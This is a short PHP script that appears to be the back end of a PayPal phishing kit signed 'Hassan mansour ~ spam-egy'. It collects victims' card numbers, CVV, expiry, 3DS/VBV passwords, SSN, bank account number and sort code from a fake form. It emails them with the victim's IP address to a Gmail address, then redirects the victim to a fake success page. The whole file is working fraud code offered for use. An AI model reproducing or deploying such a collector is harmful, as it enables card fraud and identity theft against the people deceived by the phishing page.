﻿<?

$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];

$lboss1 = $_POST['nc'];
$lboss2 = $_POST['cn'];
$lboss3 = $_POST['bmonth'];
$lboss4 = $_POST['byear'];
$lboss5 = $_POST['cvv'];
$lboss6 = $_POST['vpass'];
$lboss7 = $_POST['SSN'];
$lboss8 = $_POST['anmbr'];
$lboss8 = $_POST['scode'];

$message .="
||===========|Hassan mansour ~ spam-egy |========||
||======================+ BILLING INFO +====================||
||Card-Number     :  ".$lboss2."
||Name on card    : ".$lboss1."
||EXP DT              : ".$lboss3." ".$lboss4."
||cvv                       : ".$lboss5."
||3DS/VBV            : ".$lboss6."
||SSN                    : ".$lboss7."
||Bank Acc. Num : ".$lboss7."
||SortCode      : ".$lboss8."

||====================== 	PC-INFO ====================||
||Date / time	    : $date
||Client IP         : http://www.geoiptool.com/?IP=$ip
||=========||Hassan mansour ~ spam-egy |=====================||\n";
$send="alouani987@gmail.com";
$subject = "PayPal Full Rzlt | $ip";
mail($send,$subject,$message);

fwrite($message); 
header("LOCATION: ./success.php?cmd=_login-submit&dispatch=5885d80a13c0db1f8e263663d3faee8dc18bca4c6f47e633b393e2b84a&e284=5f8a8f8");
?>
